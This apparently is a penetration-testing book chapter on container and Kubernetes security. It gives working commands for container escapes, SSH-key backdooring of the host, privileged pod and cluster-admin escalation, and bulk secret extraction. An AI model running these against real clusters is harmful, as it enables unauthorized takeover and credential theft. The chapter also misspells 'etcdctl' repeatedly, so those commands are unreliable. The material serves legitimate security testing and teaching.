# Chapter 9: Container and Kubernetes Security Testing

## 9.1 Introduction to Container Security Testing

Container technology has revolutionized modern application deployment, with Docker and Kubernetes becoming the de facto standards for containerization and orchestration. However, the ephemeral, distributed nature of containerized environments introduces unique security challenges that traditional penetration testing approaches often fail to address adequately. Container security testing requires a specialized skillset that combines Linux kernel security knowledge, cloud-native architecture understanding, and familiarity with container-specific attack vectors.

The container security landscape presents multiple layers of potential compromise: the container runtime, the container images themselves, the orchestration platform, the underlying host systems, and the supply chain that produces these artifacts. A comprehensive container penetration test must evaluate each of these layers systematically, understanding that a vulnerability at any level can cascade into complete cluster compromise.

Unlike traditional monolithic applications where compromise might grant access to a single server, Kubernetes clusters often host dozens or hundreds of microservices with complex network topologies and permission relationships. A single misconfigured pod can serve as a beachhead for lateral movement across the entire cluster, potentially accessing sensitive data, cryptographic secrets, or critical infrastructure components.

This chapter provides a thorough methodology for testing container and Kubernetes environments, covering reconnaissance techniques, exploitation strategies for common misconfigurations, container escape methodologies, and post-exploitation tactics specific to orchestrated environments. The techniques presented here reflect real-world attack scenarios observed in production environments and security research.

## 9.2 Docker Container Security Fundamentals

### 9.2.1 Container Architecture and Isolation Mechanisms

Understanding Docker security requires knowledge of the underlying Linux kernel features that provide container isolation. Docker utilizes several kernel mechanisms working in concert: namespaces for process isolation, cgroups for resource limitation, capabilities for fine-grained privilege control, and seccomp/AppArmor/SELinux for system call filtering and mandatory access control.

Namespaces create isolated views of the system for each container. The PID namespace isolates process IDs, the NET namespace provides separate network stacks, the MNT namespace creates isolated filesystem mounts, the UTS namespace allows independent hostnames, the IPC namespace isolates inter-process communication, the USER namespace maps container users to host users, and the CGROUP namespace isolates cgroup hierarchies. Understanding these boundaries is crucial for identifying escape vectors.

When assessing container security, first determine which namespaces are in use and whether any provide weak isolation. The USER namespace is particularly important—without it, root inside the container equals root on the host. Check namespace configuration with:

```bash
# Examine namespace configuration of a running container
ps aux | grep containerd-shim
ls -la /proc/[PID]/ns/

# Check if user namespaces are enabled
cat /proc/sys/user/max_user_namespaces

# Inspect container runtime configuration
docker inspect <container_id> --format='{{.HostConfig}}'
```

Capabilities provide fine-grained privilege control, breaking the traditional root/non-root binary into distinct privileges. Docker drops most capabilities by default, but containers often run with dangerous capability additions. The CAP_SYS_ADMIN capability effectively grants root privileges, as does CAP_SYS_PTRACE in many scenarios. CAP_NET_ADMIN allows network interface manipulation, and CAP_SYS_MODULE permits kernel module loading.

Audit container capabilities using:

```bash
# Check capabilities of running container
docker inspect <container_id> --format='{{.HostConfig.CapAdd}}'
docker inspect <container_id> --format='{{.HostConfig.CapDrop}}'

# Examine effective capabilities inside container
cat /proc/self/status | grep Cap
capsh --decode=$(cat /proc/self/status | grep CapEff | awk '{print $2}')

# List all possible capabilities
docker run --rm -it alpine:latest sh -c "cat /usr/include/linux/capability.h | grep CAP_"
```

Seccomp (secure computing mode) filters available system calls. Docker applies a default seccomp profile that blocks approximately 44 dangerous syscalls, but many organizations disable this protection for compatibility reasons. AppArmor and SELinux provide mandatory access control policies that restrict what containers can access beyond standard Unix permissions.

### 9.2.2 Container Escape Techniques

Container escape represents the primary goal of many container-focused attacks. Successful escape transforms limited container access into host-level compromise, often with root privileges. Multiple escape vectors exist, ranging from kernel exploits to misconfigured capabilities to volume mount abuse.

**Privileged Container Escape**

Privileged containers effectively disable most security isolation, granting the container full access to host devices, the ability to modify kernel parameters, and unrestricted system call access. When encountering a privileged container during assessment, escape is typically straightforward.

Check if a container runs in privileged mode:

```bash
# Inside the container, check for privileged indicators
ls -la /dev/ | grep -E "(sda|xvda|nvme)"
cat /proc/1/status | grep CapEff
cat /proc/self/cgroup

# Check if device access is unrestricted
ls /dev/ | wc -l
```

If privileged, multiple escape methods exist. The most direct approach mounts the host root filesystem:

```bash
# Escape via host filesystem mount
docker run --rm -it --privileged --pid=host alpine:latest nsenter --target 1 --mount --uts --ipc --net -- bash

# Manual privileged escape inside container
mkdir /tmp/host-root
mount /dev/sda1 /tmp/host-root  # Adjust device as needed
chroot /tmp/host-root /bin/bash
```

**Docker Socket Mount Escape**

Mounting the Docker socket (/var/run/docker.sock) into a container is a common but dangerous practice. This grants the container full Docker daemon access, equivalent to root on the host. Many CI/CD pipelines and development environments use this pattern, creating attractive targets.

Detect Docker socket mounts:

```bash
# Check for Docker socket inside container
ls -la /var/run/docker.sock
ls -la /run/docker.sock

# Test Docker daemon connectivity
docker ps
```

If the socket is accessible, escape by creating a new container with host access:

```bash
# Escape via Docker socket access
docker run --rm -it -v /:/host alpine:latest chroot /host /bin/bash

# More stealthy approach - create container that adds SSH key
docker run --rm -it -v /root:/root alpine:latest sh -c "echo 'ssh-rsa AAAA...' >> /root/.ssh/authorized_keys"

# Access host namespaces directly
docker run --rm -it --net=host --pid=host --privileged alpine:latest nsenter -t 1 -m -n -i sh
```

**Kernel Exploit Container Escapes**

Kernel vulnerabilities provide universal escape methods regardless of container configuration. Several high-profile vulnerabilities specifically target container environments or provide reliable container escapes.

The Dirty Cow (CVE-2016-5195) vulnerability allows privilege escalation through race conditions in the copy-on-write mechanism. While patched in modern kernels, legacy systems remain vulnerable:

```bash
# Check kernel version for known vulnerabilities
uname -r

# Common kernel exploits for container escape:
# - CVE-2016-5195 (Dirty Cow)
# - CVE-2017-1000112 (Linux Kernel Privilege Escalation)
# - CVE-2018-18955 (user namespace privilege escalation)
# - CVE-2021-3493 (OverlayFS privilege escalation)
# - CVE-2022-0847 (Dirty Pipe)
# - CVE-2022-0185 (File System Context Privilege Escalation)
```

**Capability-Based Escapes**

Specific Linux capabilities enable container escape even without full privileged mode. CAP_SYS_PTRACE allows process debugging across container boundaries, CAP_SYS_ADMIN enables mount operations, and CAP_NET_ADMIN permits network-level attacks.

With CAP_SYS_PTRACE, escape by injecting code into host processes:

```bash
# Check for CAP_SYS_PTRACE
if capsh --print | grep -q 'cap_sys_ptrace'; then
    echo "CAP_SYS_PTRACE enabled - escape possible"
fi

# Find host processes accessible from container
ps aux

# Inject shellcode into host process using ptrace
# Requires appropriate tools compiled for target architecture
```

**Volume Mount Abuse**

Excessive volume mounts create escape opportunities by exposing host filesystems to container processes. Mounting /proc, /sys, or host directories containing sensitive files enables information disclosure and privilege escalation.

Common dangerous mounts to identify:

```bash
# Check mounted filesystems
cat /proc/mounts
mount | grep -E "( / |/proc|/sys|/etc|/root)"

# Look for exposed SSH keys
find / -name "id_rsa" 2>/dev/null
find / -name "*.pem" 2>/dev/null

# Check for kubeconfig files
find / -name "kubeconfig" -o -name "config" -path "*/.kube/*" 2>/dev/null
```

### 9.2.3 Container Image Security Analysis

Container images represent a critical attack surface. Images often contain vulnerable software, embedded secrets, and unnecessary components that expand the attack surface. Comprehensive image analysis forms an essential component of container security testing.

Static image analysis begins with inspecting image layers and configuration:

```bash
# Pull and inspect image
docker pull target-image:tag

# View image history - reveals build process and potential secrets
docker history target-image:tag --no-trunc

# Export image for offline analysis
docker save target-image:tag -o image.tar
tar -xf image.tar

# Inspect image manifest and configuration
cat manifest.json | jq .
cat *.json | jq '.config.Env, .config.Cmd, .config.Entrypoint'
```

**Trivy Image Scanning**

Trivy by Aqua Security provides comprehensive container image vulnerability scanning. It detects operating system package vulnerabilities, application dependencies, and infrastructure-as-code misconfigurations.

Install and operate Trivy:

```bash
# Install Trivy
wget -qO - https://aquasecurity.github.io/trivy-repo/deb/public.key | sudo apt-key add -
echo "deb https://aquasecurity.github.io/trivy-repo/deb $(lsb_release -sc) main" | sudo tee -a /etc/apt/sources.list.d/trivy.list
sudo apt-get update && sudo apt-get install trivy

# Scan container image for vulnerabilities
trivy image target-image:tag
trivy image --severity HIGH,CRITICAL target-image:tag

# Scan for specific vulnerability types
trivy image --vuln-type os,library target-image:tag

# Generate JSON report for further processing
trivy image -f json -o scan-results.json target-image:tag

# Scan filesystem without running container
trivy filesystem /path/to/extracted/image
```

**Embedded Secret Detection**

Container images frequently contain hardcoded credentials, API keys, and cryptographic material. These artifacts persist in image layers even when removed from the final layer, as Docker's layered filesystem preserves history.

Search for embedded secrets:

```bash
# Extract all layers from image
mkdir -p image-extracted
cd image-extracted
tar -xf ../image.tar
for layer in */layer.tar; do tar -xf "$layer"; done

# Search for common secret patterns
grep -r -E "(password|passwd|pwd|secret|key|token)" . 2>/dev/null
grep -r -E "[a-zA-Z0-9]{20,}" . 2>/dev/null | grep -i "api\|key\|token"

# Search for SSH keys
find . -name "*.pem" -o -name "*.key" -o -name "id_rsa" -o -name "id_ed25519"

# Check environment variables in image config
cat *.json | jq -r '.config.Env[]' | grep -i -E "(pass|key|secret|token)"

# Use specialized secret scanning tools
trufflehog filesystem .
gitleaks detect --source . --verbose
```

**Image Layer Analysis**

Docker images consist of layered filesystems, and sensitive data "deleted" in later layers persists in earlier ones. This creates opportunities to recover secrets that developers believed removed.

```bash
# Analyze each layer independently
for layer in $(ls -1 | grep -E '^[a-f0-9]{64}$'); do
    echo "=== Analyzing layer: $layer ==="
    mkdir -p "layer-$layer"
    tar -xf "$layer/layer.tar" -C "layer-$layer"
    grep -r "password" "layer-$layer" 2>/dev/null
done

# Use dive tool for interactive layer exploration
# Install dive: https://github.com/wagoodman/dive
dive target-image:tag
```

## 9.3 Kubernetes Reconnaissance and Enumeration

### 9.3.1 Initial Access and Service Discovery

Kubernetes clusters present multiple entry points for security testing. External exposure of the Kubernetes API server, dashboard interfaces, exposed services, and compromised container registries all provide potential initial access vectors. Systematic reconnaissance identifies these entry points and maps the cluster attack surface.

**API Server Discovery**

The Kubernetes API server represents the primary management interface. While production clusters should restrict API access to authorized networks, misconfigurations frequently expose this critical component publicly.

Discover exposed Kubernetes API endpoints:

```bash
# Shodan search for Kubernetes API servers
shodan search "Kubernetes" "https" port:6443
shodan search "Kubernetes" "k8s" port:6443

# Common API server paths to test
# https://target:6443/api
# https://target:6443/api/v1
# https://target:6443/apis
# https://target:6443/openapi/v2
# https://target:6443/version

# Check for anonymous access
curl -k https://target:6443/api/v1/namespaces
curl -k https://target:6443/version

# Test with default credentials if basic auth enabled
curl -k -u admin:admin https://target:6443/api/v1/namespaces
curl -k -u kubernetes-admin:kubernetes-admin https://target:6443/api/v1/namespaces
```

**etcd Enumeration**

etcd serves as Kubernetes' backing store, containing all cluster state, secrets, and configuration. Exposed etcd instances (default port 2379) represent critical vulnerabilities providing complete cluster compromise.

Test etcd exposure:

```bash
# Check etcd endpoint without authentication
curl http://target:2379/v2/keys/
curl http://target:2379/v3/cluster/member/list

# With TLS but no client auth
curl -k https://target:2379/v2/keys/

# Check for etcd authentication bypass
etcdctl --endpoints=http://target:2379 get / --prefix
ectcdctl --endpoints=https://target:2379 --insecure-transport get / --prefix

# Extract secrets if accessible
etcdctl get /registry/secrets --prefix -w json
```

**Kubelet API Enumeration**

Kubelet runs on every node, exposing an API (default port 10250/10255) for pod management. Unauthorized access enables pod listing, execution within containers, and potential node compromise.

Test kubelet API access:

```bash
# Check for anonymous kubelet access
curl -k https://target:10250/pods
curl -k https://target:10250/runningpods/
curl -k https://target:10250/spec/

# Check read-only port (deprecated but still found)
curl http://target:10255/pods
curl http://target:10255/metrics

# Execute command in pod if authorized
curl -k -X POST "https://target:10250/exec/namespace/pod/container?command=ls&command=/&input=1&output=1&tty=0"

# Use kubectl with kubelet credentials
kubectl --kubeconfig=kubelet.kubeconfig get pods --all-namespaces
```

### 9.3.2 Internal Cluster Reconnaissance

Once access is gained—whether through compromised pod, stolen credentials, or misconfigured access—comprehensive internal enumeration maps the cluster topology, identifies high-value targets, and reveals privilege escalation paths.

**Service Account Token Extraction**

Kubernetes automatically mounts service account tokens into pods at /var/run/secrets/kubernetes.io/serviceaccount/token. These tokens authenticate to the API server with the pod's associated service account permissions.

```bash
# Extract service account token from within pod
cat /var/run/secrets/kubernetes.io/serviceaccount/token

# Extract CA certificate for API server validation
cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt

# Get namespace
NAMESPACE=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)
echo "Running in namespace: $NAMESPACE"

# Configure kubectl with extracted token
kubectl config set-cluster compromised --server=https://kubernetes.default.svc --certificate-authority=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
kubectl config set-credentials compromised --token=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
kubectl config set-context compromised --cluster=compromised --user=compromised --namespace=$NAMESPACE
kubectl config use-context compromised
```

**Comprehensive Cluster Enumeration**

With API access established, enumerate cluster resources systematically:

```bash
# Enumerate all namespaces (indicates scope of access)
kubectl get namespaces

# List all pods cluster-wide with details
kubectl get pods --all-namespaces -o wide

# List secrets (high value targets)
kubectl get secrets --all-namespaces
kubectl get secrets -n kube-system

# List configmaps (often contain credentials)
kubectl get configmaps --all-namespaces -o yaml

# Enumerate service accounts
kubectl get serviceaccounts --all-namespaces

# Check RBAC permissions
kubectl get clusterroles
kubectl get clusterrolebindings
kubectl get roles --all-namespaces
kubectl get rolebindings --all-namespaces

# List persistent volumes (may contain sensitive data)
kubectl get pv
kubectl get pvc --all-namespaces

# Enumerate network policies
kubectl get networkpolicies --all-namespaces

# Check for pod security policies (or Pod Security Standards)
kubectl get psp  # Deprecated in 1.21+
kubectl get ns -o=jsonpath='{range .items[*]}{.metadata.name}{"\t"}{.metadata.labels}{"\n"}{end}' | grep -E "pod-security|pod-security.kubernetes.io"
```

**Kube-Hunter Automated Scanning**

Kube-hunter by Aqua Security automates Kubernetes security scanning from both external and internal perspectives. It tests for known vulnerabilities, misconfigurations, and exposed interfaces.

Deploy and run kube-hunter:

```bash
# Run kube-hunter remotely against cluster
kube-hunter --remote target-cluster.com

# Run kube-hunter from within cluster (pod deployment)
kubectl create -f https://raw.githubusercontent.com/aquasecurity/kube-hunter/main/job.yaml

# Check results
kubectl logs job/kube-hunter

# Passive scanning mode (no exploitation)
kube-hunter --remote target.com --passive

# Include high-severity vulnerabilities only
kube-hunter --remote target.com --report json | jq '.vulnerabilities[] | select(.severity=="high")'
```

## 9.4 Kubernetes RBAC Security Testing

### 9.4.1 RBAC Fundamentals and Permission Analysis

Kubernetes Role-Based Access Control (RBAC) regulates access to API resources based on roles assigned to users and service accounts. RBAC misconfigurations consistently rank among the most critical Kubernetes security issues, frequently enabling privilege escalation from limited access to cluster-admin capabilities.

RBAC comprises four primary objects:

- **Role**: Defines permissions within a specific namespace
- **ClusterRole**: Defines permissions across the entire cluster
- **RoleBinding**: Grants Role permissions to users/service accounts within a namespace
- **ClusterRoleBinding**: Grants ClusterRole permissions to users/service accounts cluster-wide

Analyze current permissions using:

```bash
# Check own permissions (requires impersonation or existing access)
kubectl auth can-i --list
kubectl auth can-i --list --namespace=target-namespace

# Test specific permissions
kubectl auth can-i create pods
kubectl auth can-i create pods --namespace=kube-system
kubectl auth can-i create clusterroles
kubectl auth can-i '*' '*' --all-namespaces

# Check permissions of specific service account
kubectl auth can-i --list --as=system:serviceaccount:namespace:serviceaccount-name

# Check cluster-admin equivalent
kubectl auth can-i create clusterrolebindings
kubectl auth can-i create clusterroles
kubectl auth can-i '*' '*' --all-namespaces
```

### 9.4.2 Dangerous RBAC Permission Patterns

Certain RBAC permissions create privilege escalation opportunities. Identifying these permissions enables targeted exploitation of RBAC weaknesses.

**Pod Creation Permissions**

Permission to create pods enables multiple attack vectors. Attackers can create privileged pods, mount host filesystems, or execute arbitrary containers with elevated capabilities.

Escalate via pod creation:

```bash
# Create privileged pod with host access
cat > privileged-pod.yaml << 'EOF'
apiVersion: v1
kind: Pod
metadata:
  name: privileged-exploit
spec:
  containers:
  - name: exploit
    image: alpine:latest
    command: ["sleep", "infinity"]
    securityContext:
      privileged: true
    volumeMounts:
    - name: host-root
      mountPath: /host
  volumes:
  - name: host-root
    hostPath:
      path: /
      type: Directory
EOF

kubectl apply -f privileged-pod.yaml
kubectl exec -it privileged-exploit -- chroot /host /bin/bash
```

**Role/ClusterRole Creation and Binding**

Permissions to create or bind roles enable privilege escalation through self-granted permissions. The ability to create ClusterRoleBindings is particularly dangerous, allowing assignment of cluster-admin to oneself.

```bash
# Escalate by creating clusterrolebinding to cluster-admin
cat > escalation.yaml << 'EOF'
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRoleBinding
metadata:
  name: exploit-binding
roleRef:
  apiGroup: rbac.authorization.k8s.io
  kind: ClusterRole
  name: cluster-admin
subjects:
- kind: ServiceAccount
  name: compromised-sa
  namespace: default
EOF

kubectl apply -f escalation.yaml
```

**Secret Access Permissions**

Read access to secrets frequently provides indirect privilege escalation. Secrets often contain service account tokens, cloud provider credentials, database passwords, and API keys.

```bash
# Extract all secrets from accessible namespaces
kubectl get secrets --all-namespaces -o json | jq '.items[] | {name: .metadata.name, namespace: .metadata.namespace, data: .data}'

# Decode specific secret
kubectl get secret target-secret -n target-namespace -o jsonpath='{.data.password}' | base64 -d

# Look for service account tokens in secrets
kubectl get secrets --all-namespaces -o json | jq '.items[] | select(.type=="kubernetes.io/service-account-token")'
```

**Node and Proxy Permissions**

The nodes/proxy permission grants access to the kubelet API on any node. The pods/exec permission enables arbitrary command execution in any pod. Both represent significant privileges.

```bash
# Use nodes/proxy to access kubelet
curl -k "https://kubernetes.default.svc/api/v1/nodes/target-node/proxy/runningpods/"

# Execute in pods with pods/exec permission
kubectl exec -it target-pod -n target-ns -- /bin/sh
```

### 9.4.3 RBAC Exploitation Automation with kubectl

Automate RBAC analysis and exploitation using kubectl and custom scripts:

```bash
# Kubeaudit for RBAC analysis
kubeaudit rbac -k /path/to/kubeconfig

# Generate comprehensive permission map
kubectl get clusterrolebindings -o json | jq -r '.items[] | "\(.metadata.name): \(.subjects[]?.name) -> \(.roleRef.name)"'

# Find service accounts with cluster-admin
kubectl get clusterrolebindings -o json | jq -r '.items[] | select(.roleRef.name=="cluster-admin") | .subjects[]?.name'

# Identify risky permissions across all roles
kubectl get clusterroles -o json | jq '.items[] | select(.rules[]?.verbs[]? | contains("create") and (.resources[]? | contains("pods"))) | .metadata.name'

# Check for wildcard permissions
kubectl get clusterroles -o json | jq '.items[] | select(.rules[]?.verbs[]? == "*") | .metadata.name'
```

## 9.5 Pod Security Testing

### 9.5.1 Pod Security Standards and Violations

Kubernetes Pod Security Standards (replacing Pod Security Policies) define three security levels: Privileged (unrestricted), Baseline (minimal restrictions), and Restricted (hardened). Testing involves identifying pods violating these standards and exploiting the resulting weaknesses.

Common Pod Security Standard violations create exploitation opportunities:

**Privileged Containers**

Privileged containers bypass most security controls. Identify and exploit:

```bash
# Find privileged pods cluster-wide
kubectl get pods --all-namespaces -o json | jq '.items[] | select(.spec.containers[].securityContext.privileged==true) | {name: .metadata.name, namespace: .metadata.namespace}'

# Find pods with dangerous capabilities
kubectl get pods --all-namespaces -o json | jq '.items[] | select(.spec.containers[].securityContext.capabilities.add[]? | test("SYS_ADMIN|NET_ADMIN|SYS_PTRACE|SYS_MODULE"; "i"))'

# Find pods without resource limits
kubectl get pods --all-namespaces -o json | jq '.items[] | select(.spec.containers[].resources.limits == null)'
```

**Host Namespace Sharing**

Pods sharing host namespaces (PID, Network, IPC) gain visibility and access to host processes and network interfaces:

```bash
# Find pods sharing host namespaces
kubectl get pods --all-namespaces -o json | jq '.items[] | select(.spec.hostPID==true or .spec.hostNetwork==true or .spec.hostIPC==true)'

# Exploit hostPID to escape
# With hostPID: true, access host processes from container
ps aux  # Shows host processes
nsenter --target 1 --mount -- /bin/bash  # Enter host namespaces
```

**Volume Mount Analysis**

Dangerous volume mounts expose host filesystems or sensitive locations:

```bash
# Find pods with hostPath volumes
kubectl get pods --all-namespaces -o json | jq '.items[] | select(.spec.volumes[].hostPath) | {name: .metadata.name, namespace: .metadata.namespace, paths: [.spec.volumes[].hostPath.path]}'

# Identify pods with Docker socket mounts
kubectl get pods --all-namespaces -o json | jq '.items[] | select(.spec.volumes[].hostPath.path=="/var/run/docker.sock")'

# Find pods with sensitive host paths
kubectl get pods --all-namespaces -o json | jq '.items[] | select(.spec.volumes[].hostPath.path | test("/etc|/root|/var/lib/kubelet"; "i"))'
```

### 9.5.2 Kubeaudit Security Auditing

Kubeaudit by Shopify provides comprehensive Kubernetes security auditing, checking for security misconfigurations in pods, networks, and cluster configurations.

Install and run kubeaudit:

```bash
# Install kubeaudit
go install github.com/Shopify/kubeaudit/cmd/kubeaudit@latest

# Run all auditors against cluster
kubeaudit all -k /path/to/kubeconfig

# Run specific auditors
kubeaudit privesc -k /path/to/kubeconfig
kubeaudit caps -k /path/to/kubeconfig
kubeaudit hostns -k /path/to/kubeconfig

# Audit manifest files offline
kubeaudit all -f pod-manifest.yaml

# Generate JSON output for automation
kubeaudit all -k /path/to/kubeconfig -o json | jq '.[].AuditResultSummary'
```

### 9.5.3 Sidecar Injection and Service Mesh Attacks

Service meshes like Istio and Linkerd inject sidecar containers for traffic management. These sidecars often run with elevated privileges and can be exploited for interception, manipulation, or escape.

**Istio Sidecar Analysis**

Istio's sidecar proxy (Envoy) intercepts all pod traffic and typically runs with specific capabilities:

```bash
# Identify Istio-injected pods
kubectl get pods --all-namespaces -o json | jq '.items[] | select(.metadata.annotations."sidecar.istio.io/status") | .metadata.name'

# Check Istio sidecar configuration
istioctl proxy-config cluster pod-name.namespace
istioctl proxy-config listener pod-name.namespace

# Check for Istio security policies
kubectl get peerauthentication --all-namespaces
kubectl get authorizationpolicy --all-namespaces

# Check if mTLS is strictly enforced
kubectl get peerauthentication -n namespace -o yaml | grep mode
```

**Sidecar Privilege Escalation**

Istio sidecars frequently run with CAP_NET_ADMIN for traffic redirection. Compromising an application container may enable sidecar compromise and network-level attacks:

```bash
# From compromised pod, access sidecar admin interface
curl http://localhost:15000/clusters
curl http://localhost:15000/config_dump

# Check for exposed Envoy admin interface
curl http://localhost:15000/server_info

# Dump TLS certificates from sidecar
# (Requires specific Istio/Envoy versions and configurations)
```

## 9.6 etcd Security and Exploitation

### 9.6.1 etcd as the Kubernetes Brain

etcd stores all Kubernetes cluster state including secrets, configmaps, deployment specifications, and network policies. Unauthorized etcd access equals complete cluster compromise, as etcd data includes all secret values in plaintext (base64 encoded but not encrypted by default).

**etcd Reconnaissance**

```bash
# Check etcd endpoint accessibility
ectcdctl --endpoints=https://etcd-host:2379 endpoint status

# List all keys (Kubernetes stores everything under /registry)
ectcdctl get /registry --prefix --keys-only | head -100

# Check etcd authentication
ectcdctl --endpoints=https://etcd-host:2379 auth status

# Check etcd version for known vulnerabilities
ectcdctl --endpoints=https://etcd-host:2379 version
```

### 9.6.2 etcd Data Extraction and Analysis

Extract and analyze etcd data to obtain cluster secrets and configuration:

```bash
# Extract all secrets from etcd
ectcdctl get /registry/secrets --prefix -w json > secrets.json

# Parse extracted secrets
cat secrets.json | jq '.kvs[] | {key: .key | @base64d, value: .value | @base64d}'

# Extract specific namespace secrets
ectcdctl get /registry/secrets/default --prefix

# Extract configmaps (often contain credentials)
ectcdctl get /registry/configmaps --prefix -w json > configmaps.json

# Search for specific patterns in etcd
for key in $(etcdctl get /registry --prefix --keys-only); do
    value=$(etcdctl get "$key" -w json | jq -r '.kvs[0].value' | base64 -d)
    if echo "$value" | grep -i "password\|secret\|token\|key"; then
        echo "Found in: $key"
    fi
done
```

### 9.6.3 etcd Privilege Escalation

With etcd write access, attackers can modify cluster state directly, creating backdoor accounts, escalating privileges, or disrupting operations:

```bash
# Create backdoor service account directly in etcd
# (Requires crafting proper protobuf-encoded data)

# Modify existing role binding to add malicious subject
# Extract, modify, and re-insert etcd entries

# etcd snapshot extraction for offline analysis
etcdctl snapshot save backup.db
etcdctl snapshot restore backup.db --data-dir=/tmp/etcd-restore

# Extract data from restored etcd
strings /tmp/etcd-restore/member/snap/db | grep -i "password\|secret"
```

## 9.7 Secrets Management and Security Testing

### 9.7.1 Kubernetes Secrets Architecture

Kubernetes secrets store sensitive data such as passwords, tokens, and keys. By default, secrets are base64-encoded (not encrypted) and stored in etcd. Various encryption providers and external secret management systems can improve this security posture.

**Secret Enumeration and Extraction**

```bash
# List all secrets across cluster
kubectl get secrets --all-namespaces

# Extract secret values
kubectl get secret <secret-name> -n <namespace> -o yaml

# Decode specific fields
kubectl get secret <secret-name> -n <namespace> -o jsonpath='{.data.password}' | base64 -d

# Bulk extract all secrets
for ns in $(kubectl get ns -o jsonpath='{.items[*].metadata.name}'); do
    for secret in $(kubectl get secrets -n $ns -o jsonpath='{.items[*].metadata.name}'); do
        echo "=== $ns/$secret ==="
        kubectl get secret $secret -n $ns -o json | jq -r '.data | to_entries[] | "\(.key): \(.value | @base64d)"' 2>/dev/null
    done
done

# Find service account tokens
kubectl get secrets --all-namespaces -o json | jq '.items[] | select(.type=="kubernetes.io/service-account-token") | {name: .metadata.name, namespace: .metadata.namespace, serviceAccount: .metadata.annotations."kubernetes.io/service-account.name"}'
```

### 9.7.2 External Secrets Management Testing

Organizations frequently integrate external secret managers (HashiCorp Vault, AWS Secrets Manager, Azure Key Vault, GCP Secret Manager). Test these integrations for:

- Overly permissive IAM roles
- Hardcoded credentials in pod configurations
- Missing authentication on secret retrieval
- Insufficient audit logging

```bash
# Check for Vault integration
kubectl get secrets --all-namespaces -o json | jq '.items[] | select(.metadata.annotations."vault.hashicorp.com/")'

# Check for external secrets operator
kubectl get externalsecrets --all-namespaces

# Analyze secret provider class configurations
kubectl get secretproviderclass --all-namespaces -o yaml

# Check for hardcoded cloud provider credentials
kubectl get secrets --all-namespaces -o json | jq '.items[] | select(.data | keys[] | test("aws|azure|gcp|google"; "i"))'
```

### 9.7.3 Secrets in etcd and Memory Analysis

Secrets in etcd exist in plaintext without encryption configuration. Additionally, secrets may be extractable from running container memory:

```bash
# Check if etcd encryption is enabled
kubectl get apiserver -o yaml 2>/dev/null || kubectl get -n kube-system pod -l component=kube-apiserver -o yaml | grep -A5 encryption

# Check encryption configuration
kubectl get -n kube-system configmap -o yaml | grep -i encryption

# Memory dump from pod (if privileged)
cat /proc/$(pidof target-process)/mem > /tmp/memory.dump
strings /tmp/memory.dump | grep -i "password\|token\|secret"
```

## 9.8 Supply Chain Security and Container Image Attacks

### 9.8.1 Container Supply Chain Vulnerabilities

The container supply chain—from source code to running container—presents multiple attack vectors. Compromised base images, vulnerable dependencies, poisoned registries, and malicious build processes all introduce risk.

**Image Provenance Verification**

Test image provenance and signature verification:

```bash
# Check if images are signed
# Cosign signature verification
cosign verify --key cosign.pub image:tag

# Notary signature checking
notary list registry/image

# Check image digest consistency
kubectl get pods --all-namespaces -o json | jq '.items[].spec.containers[].image'

# Verify digest against expected values
kubectl get pods --all-namespaces -o json | jq '.items[].status.containerStatuses[].imageID'
```

**Registry Security Testing**

Container registries often expose administrative interfaces or permit anonymous access:

```bash
# Test registry authentication
# Docker Hub
skopeo inspect docker://registry-1.docker.io/user/image

# Private registry
skopeo inspect --creds username:password docker://registry.example.com/image:tag

# Anonymous access test
curl -k https://registry.example.com/v2/_catalog
curl -k https://registry.example.com/v2/image/tags/list

# Registry enumeration
curl -k https://registry.example.com/v2/_catalog | jq '.repositories[]'
curl -k https://registry.example.com/v2/image-name/tags/list | jq '.tags[]'

# Download and analyze image layers
skopeo copy docker://registry.example.com/image:tag dir:/tmp/image-layers
```

### 9.8.2 Dependency and Base Image Vulnerabilities

Analyze container images for vulnerable dependencies and base images:

```bash
# Comprehensive image scanning with Trivy
trivy image --severity HIGH,CRITICAL registry/image:tag

# Scan for specific vulnerability classes
trivy image --vuln-type os image:tag
trivy image --vuln-type library image:tag

# Check base image age and update status
docker inspect image:tag --format='{{.Config.Labels}}'

# Analyze package lists
# Extract and compare package versions against vulnerability databases
docker run --rm image:tag cat /etc/os-release
docker run --rm image:tag dpkg -l > packages.txt  # Debian/Ubuntu
docker run --rm image:tag rpm -qa > packages.txt   # RHEL/CentOS

# Check for update availability
docker run --rm image:tag apt list --upgradable
```

### 9.8.3 Build Configuration Attacks**

Dockerfiles and build configurations frequently contain sensitive information or create exploitable conditions:

```bash
# Analyze Dockerfile security issues
# Use hadolint for Dockerfile linting
hadolint Dockerfile

# Check for secrets in build arguments
docker history --no-trunc image:tag | grep -i "password\|secret\|key\|token"

# Multi-stage build analysis - check intermediate layers
dive image:tag

# Check for ADD vs COPY usage (ADD can fetch remote URLs)
docker inspect image:tag --format='{{.Config.Cmd}} {{.Config.Entrypoint}}'

# Analyze build cache for leaked secrets
# BuildKit cache analysis
buildctl du --verbose
```

## 9.9 Runtime Security and Falco Deployment

### 9.9.1 Runtime Threat Detection

Runtime security monitoring detects anomalous behavior in running containers. Falco, the de facto standard for Kubernetes runtime security, uses system call filtering and Kubernetes audit logs to detect suspicious activities.

**Falco Rule Development and Testing**

```yaml
# Example Falco rule for detecting container escapes
- rule: Container Escape via Privileged Container
  desc: Detect privileged container attempting to access host resources
  condition: >
    spawned_process and
    container.privileged=true and
    (proc.name in ("nsenter", "chroot") or
     (proc.name="mount" and proc.args contains "/dev/sd"))
  output: >
    Potential container escape attempt
    (user=%user.name command=%proc.cmdline container=%container.name)
  priority: CRITICAL

- rule: Kubernetes Secret Access from Pod
  desc: Detect secret access patterns
  condition: >
    k8s_audit and
    verb in ("get", "list", "watch") and
    resource="secrets" and
    sourceIPs!=["127.0.0.1"]
  output: >
    Secret accessed from pod (user=%ka.user.name verb=%ka.verb resource=%ka.target.resource)
  priority: WARNING
```

**Falco Deployment for Penetration Testing**

During penetration tests, Falco deployment helps identify detection gaps:

```bash
# Deploy Falco with Helm
helm repo add falcosecurity https://falcosecurity.github.io/charts
helm install falco falcosecurity/falco \
  --set driver.kind=modern_ebpf \
  --set collectors.kubernetes.enabled=true

# Check Falco alerts
kubectl logs -l app.kubernetes.io/name=falco -f

# Generate test events
docker run --rm -it --privileged alpine:latest chroot /host /bin/sh

# Monitor Falco output during exploitation
falco -r /etc/falco/rules.d/ -M  # Monitor mode
```

